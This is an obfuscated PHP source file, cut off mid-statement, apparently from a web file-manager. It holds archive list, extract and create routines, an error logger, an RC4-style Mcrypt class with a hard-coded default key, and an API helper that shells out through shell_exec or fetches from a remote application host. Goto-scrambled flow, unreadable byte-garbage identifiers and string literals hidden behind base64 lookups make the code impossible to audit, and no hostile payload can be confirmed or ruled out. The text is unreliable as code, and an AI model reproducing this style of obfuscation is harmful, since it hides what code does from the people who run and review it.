<?php
 goto b†¡Ì¸Ëì‰; b—¿Û…Æ‰: function ActionCall($a×ÜĞ…ÌĞ¤) { $fòÑŞÑ§¾ = array_slice(func_get_args(), 1); return ActionApply($a×ÜĞ…ÌĞ¤, $fòÑŞÑ§¾); } function ActionCallApi($CšŸà®¥×¨, $dŒ÷áÑš©† = '') { goto C×÷¸Ìàéß; D¨„¸À½ÆĞ: $bˆÜ»Ëİ—„ = json_decode($dË „¸‰³©, !0); $bîµ·’»¡÷ = is_array($bˆÜ»Ëİ—„) ? $bˆÜ»Ëİ—„ : array($B—Ú¤·¯ [29] => null, $B—Ú¤·¯ [30] => $dË „¸‰³©); if (!$bˆÜ»Ëİ—„) { echo $dË „¸‰³©; } goto A‹«™­Ûô©; A‹«™­Ûô©: return $bîµ·’»¡÷; goto Aæ™¬ÕëàÓ; C×÷¸Ìàéß: $B—Ú¤·¯  =& $_SERVER[æªÊ«]; $E­ïëğåÂ = $dŒ÷áÑš©†; if (is_array($dŒ÷áÑš©†)) { $E­ïëğåÂ = $B—Ú¤·¯ [16]; foreach ($dŒ÷áÑš©† as $dœ¡–Ö¯” => $EàÎ³ùØ è) { $EàÎ³ùØ è = is_array($EàÎ³ùØ è) ? json_encode($EàÎ³ùØ è) : $EàÎ³ùØ è; $EàÎ³ùØ è = is_bool($EàÎ³ùØ è) ? intval($EàÎ³ùØ è) : $EàÎ³ùØ è; $E­ïëğåÂ .= $B—Ú¤·¯ [17] . $dœ¡–Ö¯” . $B—Ú¤·¯ [18] . rawurlencode($EàÎ³ùØ è); } } goto CğŸ‰†®µÈ; CğŸ‰†®µÈ: $A™§÷ØÚ»Õ = Action($B—Ú¤·¯ [19])->accessToken(); $CšŸà®¥×¨ = str_replace($B—Ú¤·¯ [5], $B—Ú¤·¯ [4], $CšŸà®¥×¨) . $B—Ú¤·¯ [20] . $A™§÷ØÚ»Õ . $E­ïëğåÂ; $dË „¸‰³© = $B—Ú¤·¯ [16]; goto FÑ‹ÂÚˆ‡; FÑ‹ÂÚˆ‡: $Bêß‚Æª¨ = phpBinCommand(); if ($Bêß‚Æª¨ && function_exists($B—Ú¤·¯ [21])) { $fº†ïˆ´Øá = $Bêß‚Æª¨ . $B—Ú¤·¯ [22] . BASIC_PATH . $B—Ú¤·¯ [23] . escapeshellarg($CšŸà®¥×¨); $dË „¸‰³© = shell_exec($fº†ïˆ´Øá); } if (!$dË „¸‰³©) { $bó™‹¿ ’ = stream_context_create(array($B—Ú¤·¯ [24] => array($B—Ú¤·¯ [25] => 20, $B—Ú¤·¯ [26] => $B—Ú¤·¯ [27]))); $dË „¸‰³© = file_get_contents(APP_HOST . $B—Ú¤·¯ [28] . $CšŸà®¥×¨, !1, $bó™‹¿ ’); } goto D¨„¸À½ÆĞ; Aæ™¬ÕëàÓ: } function ActionCallHook($c’Š¬¡Á…Ø) { goto B‘±ËŒ¶˜À; B‘±ËŒ¶˜À: $C†‘™Äà¢Ó =& $_SERVER[æªÊ«]; ob_start(); $eÏöÇµ°šâ = array_slice(func_get_args(), 1); goto f–Û±µ·ä¬; f–Û±µ·ä¬: $GLOBALS[$C†‘™Äà¢Ó[31]] = 1; $bÅ÷àçĞ‰ = ActionApply($c’Š¬¡Á…Ø, $eÏöÇµ°šâ); $A„œ—¯Ö° = ob_get_clean(); goto D­ªƒŞÚ—; D­ªƒŞÚ—: $bÅ÷àçĞ‰ = $A„œ—¯Ö° ? json_decode($A„œ—¯Ö°, !0) : $bÅ÷àçĞ‰; $GLOBALS[$C†‘™Äà¢Ó[31]] = 0; return $bÅ÷àçĞ‰; goto b¶ë¸à‰¿ö; b¶ë¸à‰¿ö: } goto aÚ¸ö×‹Ë; Eª¤Éˆ»Œª: function beforeShutdownError($cÅïŠËÏ– = false, $EˆÑóÀğ„ = '', $C×Œà–¢Âà = '', $E’»Îõˆì¥ = 0) { $dÒĞŠ ŞÜö =& $_SERVER[æªÊ«]; switch ($cÅïŠËÏ–) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $AÑàËööÆæ = $dÒĞŠ ŞÜö[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $AÑàËööÆæ = $dÒĞŠ ŞÜö[36]; break; case E_STRICT: $AÑàËööÆæ = $dÒĞŠ ŞÜö[37]; break; case E_NOTICE: case E_USER_NOTICE: $AÑàËööÆæ = $dÒĞŠ ŞÜö[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $AÑàËööÆæ = $dÒĞŠ ŞÜö[39]; break; default: break; } if (!$AÑàËööÆæ || $AÑàËööÆæ == $dÒĞŠ ŞÜö[38] || $AÑàËööÆæ == $dÒĞŠ ŞÜö[39]) { return; } $C×Œà–¢Âà = $dÒĞŠ ŞÜö[4] . str_replace($_SERVER[$dÒĞŠ ŞÜö[33]], $dÒĞŠ ŞÜö[16], $C×Œà–¢Âà); $fø®‘’³¸ = $AÑàËööÆæ . $dÒĞŠ ŞÜö[40] . $EˆÑóÀğ„ . $dÒĞŠ ŞÜö[40] . $C×Œà–¢Âà . $dÒĞŠ ŞÜö[40] . $E’»Îõˆì¥; write_log($fø®‘’³¸ . $dÒĞŠ ŞÜö[41] . get_caller_msg(1), $dÒĞŠ ŞÜö[15]); } $_SERVER[$_SERVER[æªÊ«][42]] = $_SERVER[$_SERVER[æªÊ«][33]] . $_SERVER[æªÊ«][43]; $b Î«ÅâÑ = strrev(base64_decode($_SERVER[æªÊ«][44])); goto bãÈöÓ¾•Ù; E†ª¶½¿‹: class KodArchive { static function init() { goto C†ÌÜİ‹‰; C†ÌÜİ‹‰: $D¯®õÓÊ =& $_SERVER[¦·]; if (defined($D¯®õÓÊ[1893])) { return; } define($D¯®õÓÊ[1893], SDK_DIR . $D¯®õÓÊ[1894]); goto aáİÛ†”éé; Dë›çÊÎÈ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $D¯®õÓÊ[1899]; require_once ARCHIVE_LIB . $D¯®õÓÊ[1900]; goto c£ñ§‹¨İ‹; c£ñ§‹¨İ‹: require_once ARCHIVE_LIB . $D¯®õÓÊ[1901]; require_once ARCHIVE_LIB . $D¯®õÓÊ[1902]; require_once ARCHIVE_LIB . $D¯®õÓÊ[1903]; goto f¢¹É¬‚õš; f¢¹É¬‚õš: require_once ARCHIVE_LIB . $D¯®õÓÊ[1904]; goto Fó×‹Ê¸åŸ; aáİÛ†”éé: define($D¯®õÓÊ[1895], TEMP_FILES); define($D¯®õÓÊ[1896], TEMP_FILES); define($D¯®õÓÊ[1897], $D¯®õÓÊ[1898]); goto Dë›çÊÎÈ; Fó×‹Ê¸åŸ: } static function checkIfType($DƒÃãÆÁĞç, $cÍæµ Ï ø) { goto bâÓßÈ§; Fç¸à½‡à‘: return $d’Ó„Ó”˜¦; goto c¨¬Ñï¹¡Ò; FŞ°–‘ß…æ: $d’Ó„Ó”˜¦ = in_array($DƒÃãÆÁĞç, $cÖ¦Êçø•½[$cÍæµ Ï ø]); if ($d’Ó„Ó”˜¦ && ($cÍæµ Ï ø == $CÚË¶øÏÁ‚[301] || $cÍæµ Ï ø == $CÚË¶øÏÁ‚[1908]) && (!function_exists($CÚË¶øÏÁ‚[1916]) || !function_exists($CÚË¶øÏÁ‚[1917]))) { show_tips($CÚË¶øÏÁ‚[1918]); } if ($d’Ó„Ó”˜¦ && $cÍæµ Ï ø == $CÚË¶øÏÁ‚[1048] && (!function_exists($CÚË¶øÏÁ‚[1919]) || !strstr(shell_exec($CÚË¶øÏÁ‚[1920]), $CÚË¶øÏÁ‚[1921]))) { show_tips($CÚË¶øÏÁ‚[1922]); } goto Fç¸à½‡à‘; bâÓßÈ§: $CÚË¶øÏÁ‚ =& $_SERVER[¦·]; self::init(); $cÖ¦Êçø•½ = array($CÚË¶øÏÁ‚[301] => array($CÚË¶øÏÁ‚[301], $CÚË¶øÏÁ‚[1905], $CÚË¶øÏÁ‚[1906], $CÚË¶øÏÁ‚[1907]), $CÚË¶øÏÁ‚[1908] => array($CÚË¶øÏÁ‚[1908], $CÚË¶øÏÁ‚[1909], $CÚË¶øÏÁ‚[1046], $CÚË¶øÏÁ‚[1044]), $CÚË¶øÏÁ‚[1048] => array($CÚË¶øÏÁ‚[1048], $CÚË¶øÏÁ‚[1910], $CÚË¶øÏÁ‚[1911], $CÚË¶øÏÁ‚[1912], $CÚË¶øÏÁ‚[1913], $CÚË¶øÏÁ‚[1914], $CÚË¶øÏÁ‚[1915])); goto FŞ°–‘ß…æ; c¨¬Ñï¹¡Ò: } static function listContent($d¨É¨æùóÏ, $C¤ ©¡˜’î = true) { $fÈ®Áœ²©Ô =& $_SERVER[¦·]; self::init(); $bêÔíÙ‰§Ñ = !empty($GLOBALS[$fÈ®Áœ²©Ô[1052]]) ? $GLOBALS[$fÈ®Áœ²©Ô[1052]] : get_path_ext($d¨É¨æùóÏ); $c‹Íî‰¿ƒĞ = !1; if (self::checkIfType($bêÔíÙ‰§Ñ, $fÈ®Áœ²©Ô[1908])) { $D¬÷Å—¶Õ = PclTarList($d¨É¨æùóÏ, $bêÔíÙ‰§Ñ); $c‹Íî‰¿ƒĞ = array(); for ($d¤•œ’½™ˆ = 0; $d¤•œ’½™ˆ < count($D¬÷Å—¶Õ); $d¤•œ’½™ˆ++) { $DİĞ­ƒ¢Ë¯ = $D¬÷Å—¶Õ[$d¤•œ’½™ˆ]; if ($DİĞ­ƒ¢Ë¯[$fÈ®Áœ²©Ô[1923]] == $fÈ®Áœ²©Ô[1924] || $DİĞ­ƒ¢Ë¯[$fÈ®Áœ²©Ô[1923]] == $fÈ®Áœ²©Ô[1925]) { continue; } if ($C¤ ©¡˜’î) { $DİĞ­ƒ¢Ë¯[$fÈ®Áœ²©Ô[1926]] = ltrim($DİĞ­ƒ¢Ë¯[$fÈ®Áœ²©Ô[1926]], $fÈ®Áœ²©Ô[1160]); } if ($DİĞ­ƒ¢Ë¯[$fÈ®Áœ²©Ô[1923]] == $fÈ®Áœ²©Ô[1927]) { $DİĞ­ƒ¢Ë¯[$fÈ®Áœ²©Ô[76]] = !0; } else { $DİĞ­ƒ¢Ë¯[$fÈ®Áœ²©Ô[76]] = !1; } $DİĞ­ƒ¢Ë¯[$fÈ®Áœ²©Ô[1039]] = $d¤•œ’½™ˆ; $c‹Íî‰¿ƒĞ[] = $DİĞ­ƒ¢Ë¯; } } else { if (self::checkIfType($bêÔíÙ‰§Ñ, $fÈ®Áœ²©Ô[1048])) { $B‡¿ŠŠƒìé = kodRarArchive::listContent($d¨É¨æùóÏ); if (!$B‡¿ŠŠƒìé[$fÈ®Áœ²©Ô[1035]]) { return $B‡¿ŠŠƒìé; } else { $c‹Íî‰¿ƒĞ = $B‡¿ŠŠƒìé[$fÈ®Áœ²©Ô[1037]]; } } else { if (kodZipArchive::support($fÈ®Áœ²©Ô[354])) { $c‹Íî‰¿ƒĞ = kodZipArchive::listContent($d¨É¨æùóÏ); } else { $c©ëÇ‚¦ = new PclZip($d¨É¨æùóÏ); $c‹Íî‰¿ƒĞ = $c©ëÇ‚¦->listContent(); } } } if ($c‹Íî‰¿ƒĞ) { $fÏ­ƒÓ£½ = unzip_charset_get($c‹Íî‰¿ƒĞ); $C¤ ©¡˜’î = $C¤ ©¡˜’î && function_exists($fÈ®Áœ²©Ô[65]); for ($d¤•œ’½™ˆ = 0; $d¤•œ’½™ˆ < count($c‹Íî‰¿ƒĞ); $d¤•œ’½™ˆ++) { $c‹Íî‰¿ƒĞ[$d¤•œ’½™ˆ][$fÈ®Áœ²©Ô[1926]] = str_replace(array($fÈ®Áœ²©Ô[1075], $fÈ®Áœ²©Ô[1928]), $fÈ®Áœ²©Ô[764], $c‹Íî‰¿ƒĞ[$d¤•œ’½™ˆ][$fÈ®Áœ²©Ô[1926]]); if ($C¤ ©¡˜’î) { $c‹Íî‰¿ƒĞ[$d¤•œ’½™ˆ][$fÈ®Áœ²©Ô[1926]] = iconv_to($c‹Íî‰¿ƒĞ[$d¤•œ’½™ˆ][$fÈ®Áœ²©Ô[1926]], $fÏ­ƒÓ£½, $fÈ®Áœ²©Ô[326]); unset($c‹Íî‰¿ƒĞ[$d¤•œ’½™ˆ][$fÈ®Áœ²©Ô[1929]]); } } return array($fÈ®Áœ²©Ô[1035] => !0, $fÈ®Áœ²©Ô[1037] => $c‹Íî‰¿ƒĞ); } else { return array($fÈ®Áœ²©Ô[1035] => !1, $fÈ®Áœ²©Ô[1037] => $c‹Íî‰¿ƒĞ); } } static function extract($D¨Ø×õ®Ëî, $dÛÏŒ¡, $cÊ®ŠÀã®ˆ = "\55\x31", &$EòÍî‡¾»® = false) { goto a¤ÇËµ¶¸¾; a¤ÇËµ¶¸¾: $EÀ‹ğ‹Ó›ª =& $_SERVER[¦·]; self::init(); $fºÉÛáÆé¤ = !empty($GLOBALS[$EÀ‹ğ‹Ó›ª[1052]]) ? $GLOBALS[$EÀ‹ğ‹Ó›ª[1052]] : get_path_ext($D¨Ø×õ®Ëî); goto EÃÖÑ‡ƒ‡æ; EÃÖÑ‡ƒ‡æ: $cá“…£õ = self::listContent($D¨Ø×õ®Ëî, !1); if (!$cá“…£õ[$EÀ‹ğ‹Ó›ª[1035]]) { return $cá“…£õ; } if ($cÊ®ŠÀã®ˆ != $EÀ‹ğ‹Ó›ª[1034]) { goto f¶á¸ö¶È; f¶á¸ö¶È: $dË˜åœáæÎ = self::fileIndex($cá“…£õ[$EÀ‹ğ‹Ó›ª[1037]], $cÊ®ŠÀã®ˆ); $EòÍî‡¾»® = str_replace(array($EÀ‹ğ‹Ó›ª[1075], $EÀ‹ğ‹Ó›ª[1928]), $EÀ‹ğ‹Ó›ª[70], $dË˜åœáæÎ[$EÀ‹ğ‹Ó›ª[1926]]); $aÕŸÌ³¬£ù = $EòÍî‡¾»®; goto D©Ÿ°Û‰‰Ì; FÁŠÃäâáì: if ($dË˜åœáæÎ[$EÀ‹ğ‹Ó›ª[76]]) { $aÕŸÌ³¬£ù = rtrim($aÕŸÌ³¬£ù, $EÀ‹ğ‹Ó›ª[8]) . $EÀ‹ğ‹Ó›ª[8]; $EòÍî‡¾»® = array($EòÍî‡¾»®); } $C…æŞ§Í­ç = str_replace($EÀ‹ğ‹Ó›ª[93], $EÀ‹ğ‹Ó›ª[8], $aÕŸÌ³¬£ù); if (substr($C…æŞ§Í­ç, -1) == $EÀ‹ğ‹Ó›ª[8]) { if (!strstr(trim($C…æŞ§Í­ç, $EÀ‹ğ‹Ó›ª[8]), $EÀ‹ğ‹Ó›ª[8])) { $dÛÏŒ¡ = $dÛÏŒ¡ . get_path_this($C…æŞ§Í­ç) . $EÀ‹ğ‹Ó›ª[8]; } } else { if ($aÁ‚¢Œ¶ãö == $aÕŸÌ³¬£ù) { $aÁ‚¢Œ¶ãö = $EÀ‹ğ‹Ó›ª[33]; } } goto EÈ¾ßµÎƒ; D©Ÿ°Û‰‰Ì: if ($GLOBALS[$EÀ‹ğ‹Ó›ª[6]][$EÀ‹ğ‹Ó›ª[1158]] != $EÀ‹ğ‹Ó›ª[326]) { $aÕŸÌ³¬£ù = unzip_pre_name($EòÍî‡¾»®); } $aÁ‚¢Œ¶ãö = get_path_father($EòÍî‡¾»®); if ($aÁ‚¢Œ¶ãö == $EòÍî‡¾»®) { $aÁ‚¢Œ¶ãö = $EÀ‹ğ‹Ó›ª[33]; } goto FÁŠÃäâáì; EÈ¾ßµÎƒ: } goto AÕ¡–Ñæ¨÷; AÕ¡–Ñæ¨÷: if (self::checkIfType($fºÉÛáÆé¤, $EÀ‹ğ‹Ó›ª[1908])) { if ($cÊ®ŠÀã®ˆ != $EÀ‹ğ‹Ó›ª[1034]) { $aÕŸÌ³¬£ù = unzip_pre_name($aÕŸÌ³¬£ù); $aÁ‚¢Œ¶ãö = unzip_pre_name($aÁ‚¢Œ¶ãö); $C‰¡–†Æ§ = PclTarExtractList($D¨Ø×õ®Ëî, array($aÕŸÌ³¬£ù), $dÛÏŒ¡, $aÁ‚¢Œ¶ãö, $fºÉÛáÆé¤); } else { $C‰¡–†Æ§ = PclTarExtract($D¨Ø×õ®Ëî, $dÛÏŒ¡, $EÀ‹ğ‹Ó›ª[361], $fºÉÛáÆé¤); } return array($EÀ‹ğ‹Ó›ª[1035] => $C‰¡–†Æ§, $EÀ‹ğ‹Ó›ª[1037] => PclErrorString(!0)); } else { if (self::checkIfType($fºÉÛáÆé¤, $EÀ‹ğ‹Ó›ª[1048])) { return kodRarArchive::extract($D¨Ø×õ®Ëî, $dÛÏŒ¡, $fºÉÛáÆé¤, $EòÍî‡¾»®); } else { if (kodZipArchive::support($EÀ‹ğ‹Ó›ª[1930])) { return kodZipArchive::extract($D¨Ø×õ®Ëî, $dÛÏŒ¡, $EòÍî‡¾»®); } else { $BÙƒÕÓºã‡ = new PclZip($D¨Ø×õ®Ëî); if ($cÊ®ŠÀã®ˆ != $EÀ‹ğ‹Ó›ª[1034]) { $C‰¡–†Æ§ = $BÙƒÕÓºã‡->extract(PCLZIP_OPT_PATH, $dÛÏŒ¡, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EÀ‹ğ‹Ó›ª[1931], PCLZIP_OPT_BY_NAME, $dË˜åœáæÎ[$EÀ‹ğ‹Ó›ª[1926]], PCLZIP_OPT_REMOVE_PATH, $aÁ‚¢Œ¶ãö, PCLZIP_OPT_REPLACE_NEWER); } else { $C‰¡–†Æ§ = $BÙƒÕÓºã‡->extract(PCLZIP_OPT_PATH, $dÛÏŒ¡, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EÀ‹ğ‹Ó›ª[1931], PCLZIP_OPT_REPLACE_NEWER); } return array($EÀ‹ğ‹Ó›ª[1035] => $C‰¡–†Æ§, $EÀ‹ğ‹Ó›ª[1037] => $BÙƒÕÓºã‡->errorName(!0)); } } } return array($EÀ‹ğ‹Ó›ª[1035] => !1, $EÀ‹ğ‹Ó›ª[1037] => $EÀ‹ğ‹Ó›ª[1932]); goto C³ÚÛ¸””Í; C³ÚÛ¸””Í: } static function fileIndex($D¿¾Ó‰›Ö, $b„Áó¶Ø‘™, $bã“ÊÂÇ¿Š = false) { goto B®ÓÉíÂ§¶; B®ÓÉíÂ§¶: $D®ï¾‡ø =& $_SERVER[¦·]; self::init(); if (!is_array($D¿¾Ó‰›Ö)) { return !1; } goto F‘‹ö›‹›; A¯…ˆÌ‹ê¶: $CÊß²„”ßŒ = $d‚¹±Ë®ÓÎ; if ($bã“ÊÂÇ¿Š) { $CÊß²„”ßŒ = $d‚¹±Ë®ÓÎ[$bã“ÊÂÇ¿Š]; if ($d‚¹±Ë®ÓÎ[$D®ï¾‡ø[76]]) { $CÊß²„”ßŒ = rtrim($CÊß²„”ßŒ, $D®ï¾‡ø[8]) . $D®ï¾‡ø[8]; } } return $CÊß²„”ßŒ; goto Fê¼ßµ÷äø; F‘‹ö›‹›: $cÎ´ë×Ú½© = count($D¿¾Ó‰›Ö); for ($b¡‘©Š¨À‰ = 0; $b¡‘©Š¨À‰ < $cÎ´ë×Ú½©; $b¡‘©Š¨À‰++) { if ($b„Áó¶Ø‘™ == $D¿¾Ó‰›Ö[$b¡‘©Š¨À‰][$D®ï¾‡ø[1039]]) { $d‚¹±Ë®ÓÎ = $D¿¾Ó‰›Ö[$b¡‘©Š¨À‰]; break; } } if (!$d‚¹±Ë®ÓÎ) { show_tips($D®ï¾‡ø[1933]); } goto A¯…ˆÌ‹ê¶; Fê¼ßµ÷äø: } static function extractZipFile($d½Ïâº®ÏÎ, $D“ÇÚƒº¨š, $FÜš•“™ŒÃ = false) { goto Aó¨Ìñ»; e¢¦ ‰è¼: mk_dir($cİæíæ˜öˆ); $bÊ’éÍÈÅ = $cİæíæ˜öˆ . md5($d½Ïâº®ÏÎ . $D“ÇÚƒº¨š); if ($FÜš•“™ŒÃ) { $bÊ’éÍÈÅ = $cİæíæ˜öˆ . $FÜš•“™ŒÃ; } goto aìåğ’; C¾Š·Š†òÍ: $AÇé×øšññ = get_path_father($D“ÇÚƒº¨š); if ($AÇé×øšññ == $D“ÇÚƒº¨š) { $AÇé×øšññ = $A®»öÜ™™¼[33]; } $d¹è÷¸²Ùç = $fëƒ¸˜¯¡Ÿ->extract(PCLZIP_OPT_PATH, $cİæíæ˜öˆ, PCLZIP_CB_PRE_FILE_NAME, $A®»öÜ™™¼[1931], PCLZIP_OPT_REMOVE_PATH, $AÇé×øšññ, PCLZIP_OPT_BY_NAME, $D“ÇÚƒº¨š); goto a¹—†‡†¢é; a¹—†‡†¢é: if (!file_exists($D¬·®Ê¼¾ô)) { return !1; } @rename($D¬·®Ê¼¾ô, $bÊ’éÍÈÅ); return $bÊ’éÍÈÅ; goto AÅä¹‘Ÿæ; aìåğ’: if (file_exists($bÊ’éÍÈÅ)) { return $bÊ’éÍÈÅ; } $fëƒ¸˜¯¡Ÿ = new PclZip($d½Ïâº®ÏÎ); $D¬·®Ê¼¾ô = unzip_filter_ext($cİæíæ˜öˆ . get_path_this($D“ÇÚƒº¨š)); goto C¾Š·Š†òÍ; Aó¨Ìñ»: $A®»öÜ™™¼ =& $_SERVER[¦·]; self::init(); $cİæíæ˜öˆ = TEMP_FILES . hash_path($d½Ïâº®ÏÎ) . $A®»öÜ™™¼[8]; goto e¢¦ ‰è¼; AÅä¹‘Ÿæ: } static function filePreview($fáâ›ÄŒÓ, $e–ª»‡Ü…Ö, $a¤ßÇ¤ó = false, $eÄå¯ø†ùî = false) { goto DˆÙ–ÚÊ´; d¯åÖéˆÕ„: if (!$fÒ­‹†•İ[$eÕÏ›Æ²±[1035]]) { show_json($fÒ­‹†•İ[$eÕÏ›Æ²±[1037]], !1); } if (!file_exists($c¨ßµŒÁö£)) { show_json($eÕÏ›Æ²±[1935], !1); } @rename($c¨ßµŒÁö£, $A—çëØ«Ş®); goto eÑóØ“Ÿ¿é; cİÂï¢„ŒĞ: mk_dir($eê¹²ÇÃ…); $A—çëØ«Ş® = $eê¹²ÇÃ… . md5($fáâ›ÄŒÓ . $e–ª»‡Ü…Ö . $eÄå¯ø†ùî); $BÇ÷‹¶ºÂ‘ = $eÕÏ›Æ²±[33]; goto cÀõĞ¦—; DˆÙ–ÚÊ´: $eÕÏ›Æ²± =& $_SERVER[¦·]; self::init(); $eê¹²ÇÃ… = TEMP_FILES . hash_path($fáâ›ÄŒÓ) . $eÕÏ›Æ²±[8]; goto cİÂï¢„ŒĞ; eÑóØ“Ÿ¿é: if (!file_exists($A—çëØ«Ş®)) { del_dir($eê¹²ÇÃ…); show_json($eÕÏ›Æ²±[1936]); } IO::fileOut($A—çëØ«Ş®, $a¤ßÇ¤ó, $aÆÅ‡†½Š¹); goto BŸÍÁ‘´ˆ; BáÕÁ¾ŞÂ³: $BÇ÷‹¶ºÂ‘ = unzip_pre_name($BÇ÷‹¶ºÂ‘); $aÆÅ‡†½Š¹ = get_path_this($BÇ÷‹¶ºÂ‘); $c¨ßµŒÁö£ = unzip_filter_ext($eê¹²ÇÃ… . $aÆÅ‡†½Š¹); goto d¯åÖéˆÕ„; cÀõĞ¦—: $fÒ­‹†•İ = self::extract($fáâ›ÄŒÓ, $eê¹²ÇÃ…, $e–ª»‡Ü…Ö, $BÇ÷‹¶ºÂ‘); if (is_array($BÇ÷‹¶ºÂ‘)) { show_json($eÕÏ›Æ²±[1934], !1); } if (file_exists($A—çëØ«Ş®)) { IO::fileOut($A—çëØ«Ş®, $a¤ßÇ¤ó, get_path_this($BÇ÷‹¶ºÂ‘)); return; } goto BáÕÁ¾ŞÂ³; BŸÍÁ‘´ˆ: } static function create($BÌíÖïĞğŞ, $eÅĞÙò¤Å±) { $Còáêé£½Ù =& $_SERVER[¦·]; self::init(); $e”Íæˆ¹Ú = get_path_ext($BÌíÖïĞğŞ); $céİÙ¾®õª = !1; if (self::checkIfType($e”Íæˆ¹Ú, $Còáêé£½Ù[301])) { if (kodZipArchive::support($Còáêé£½Ù[1014])) { return kodZipArchive::create($BÌíÖïĞğŞ, $eÅĞÙò¤Å±); } $A²½Ÿîìƒ = new PclZip($BÌíÖïĞğŞ); foreach ($eÅĞÙò¤Å± as $däœù±æœŞ => $c÷˜ğ„È¼ß) { $c÷˜ğ„È¼ß = str_replace($Còáêé£½Ù[469], $Còáêé£½Ù[8], $c÷˜ğ„È¼ß); $eÛ§ŠÖ©±é = Kodio::clear(get_path_father($c÷˜ğ„È¼ß)); if ($däœù±æœŞ == 0) { $céİÙ¾®õª = $A²½Ÿîìƒ->create($c÷˜ğ„È¼ß, PCLZIP_OPT_REMOVE_PATH, $eÛ§ŠÖ©±é, PCLZIP_CB_PRE_FILE_NAME, $Còáêé£½Ù[1937]); continue; } $céİÙ¾®õª = $A²½Ÿîìƒ->add($c÷˜ğ„È¼ß, PCLZIP_OPT_REMOVE_PATH, $eÛ§ŠÖ©±é, PCLZIP_CB_PRE_FILE_NAME, $Còáêé£½Ù[1937]); } } else { if (self::checkIfType($e”Íæˆ¹Ú, $Còáêé£½Ù[1908])) { foreach ($eÅĞÙò¤Å± as $däœù±æœŞ => $c÷˜ğ„È¼ß) { $c÷˜ğ„È¼ß = str_replace($Còáêé£½Ù[469], $Còáêé£½Ù[8], $c÷˜ğ„È¼ß); $eÛ§ŠÖ©±é = Kodio::clear(get_path_father($c÷˜ğ„È¼ß)); if ($däœù±æœŞ == 0) { $céİÙ¾®õª = PclTarCreate($BÌíÖïĞğŞ, array($c÷˜ğ„È¼ß), $e”Íæˆ¹Ú, null, $eÛ§ŠÖ©±é); continue; } $céİÙ¾®õª = PclTarAddList($BÌíÖïĞğŞ, array($c÷˜ğ„È¼ß), $Còáêé£½Ù[33], $eÛ§ŠÖ©±é, $e”Íæˆ¹Ú); } } } return $céİÙ¾®õª; } } class Mcrypt { public static $defaultKey = "\x61\41\164\141\x6b\x41\72\144\154\155\x63\x6c\x64\105\x76\x2c\x65"; public static function encode($EËéˆÏÁ², $CÒø°Øå· = '', $B…‹–Š½‡Õ = 0, $fÁ–¦øíéÍ = '') { goto D·ìßÃØ™™; Fˆ¦Ÿáô×: for ($E†‰êêŒâ­ = 0; $E†‰êêŒâ­ <= 255; $E†‰êêŒâ­++) { $E‚àƒ«‰ç[$E†‰êêŒâ­] = ord($F‹Õ¢Š¸œ[$E†‰êêŒâ­ % $f±•º¼Ø]); } $EÄĞæÓÎ£“ = range(0, 255); for ($a‘½°é¢ ” = $E†‰êêŒâ­ = 0; $E†‰êêŒâ­ < 256; $E†‰êêŒâ­++) { $a‘½°é¢ ” = ($a‘½°é¢ ” + $EÄĞæÓÎ£“[$E†‰êêŒâ­] + $E‚àƒ«‰ç[$E†‰êêŒâ­]) % 256; $CÇœ¹Üæï = $EÄĞæÓÎ£“[$E†‰êêŒâ­]; $EÄĞæÓÎ£“[$E†‰êêŒâ­] = $EÄĞæÓÎ£“[$a‘½°é¢ ”]; $EÄĞæÓÎ£“[$a‘½°é¢ ”] = $CÇœ¹Üæï; } goto bè—ÇßÈ; Aä¿–ÌíåŒ: $BçÃª“í¨Æ = substr($fÁ–¦øíéÍ, -$c¢¤êÃíÏ°); $F‹Õ¢Š¸œ = $F§¾½µ¬Ô… . md5($F§¾½µ¬Ô… . $BçÃª“í¨Æ); $f±•º¼Ø = strlen($F‹Õ¢Š¸œ); goto e¡¶Ü´‘‹‹; bè—ÇßÈ: $cÙ¿Î×–ˆ = $FäØ¾ğ§¶[33]; for ($cè¡çÃåãÏ = $a‘½°é¢ ” = $E†‰êêŒâ­ = 0; $E†‰êêŒâ­ < $DßÀá«‹í; $E†‰êêŒâ­++) { $cè¡çÃåãÏ = ($cè¡çÃåãÏ + 1) % 256; $a‘½°é¢ ” = ($a‘½°é¢ ” + $EÄĞæÓÎ£“[$cè¡çÃåãÏ]) % 256; $CÇœ¹Üæï = $EÄĞæÓÎ£“[$cè¡çÃåãÏ]; $EÄĞæÓÎ£“[$cè¡çÃåãÏ] = $EÄĞæÓÎ£“[$a‘½°é¢ ”]; $EÄĞæÓÎ£“[$a‘½°é¢ ”] = $CÇœ¹Üæï; $cÙ¿Î×–ˆ .= chr(ord($EËéˆÏÁ²[$E†‰êêŒâ­]) ^ $EÄĞæÓÎ£“[($EÄĞæÓÎ£“[$cè¡çÃåãÏ] + $EÄĞæÓÎ£“[$a‘½°é¢ ”]) % 256]); } $cÙ¿Î×–ˆ = $BçÃª“í¨Æ . str_replace($FäØ¾ğ§¶[909], $FäØ¾ğ§¶[33], base64_encode($cÙ¿Î×–ˆ)); goto A¼áÔÄËÕ; A¼áÔÄËÕ: $cÙ¿Î×–ˆ = str_replace(array($FäØ¾ğ§¶[284], $FäØ¾ğ§¶[8], $FäØ¾ğ§¶[909]), array($FäØ¾ğ§¶[412], $FäØ¾ğ§¶[70], $FäØ¾ğ§¶[91]), $cÙ¿Î×–ˆ); return $cÙ¿Î×–ˆ; goto B–Ïç¡æ; D·ìßÃØ™™: $FäØ¾ğ§¶ =& $_SERVER[¦·]; $c¢¤êÃíÏ° = 4; $CÒø°Øå· = md5($CÒø°Øå· ? $CÒø°Øå· : self::$defaultKey); goto B†……‚Ö¾µ; B†……‚Ö¾µ: $F§¾½µ¬Ô… = md5(substr($CÒø°Øå·, 0, 16)); $FôÎÄ§ØŸÇ = md5(substr($CÒø°Øå·, 16, 16)); $fÁ–¦øíéÍ = $fÁ–¦øíéÍ ? $fÁ–¦øíéÍ : md5(microtime()); goto Aä¿–ÌíåŒ; e¡¶Ü´‘‹‹: $EËéˆÏÁ² = sprintf($FäØ¾ğ§¶[1938], $B…‹–Š½‡Õ ? $B…‹–Š½‡Õ + time() : 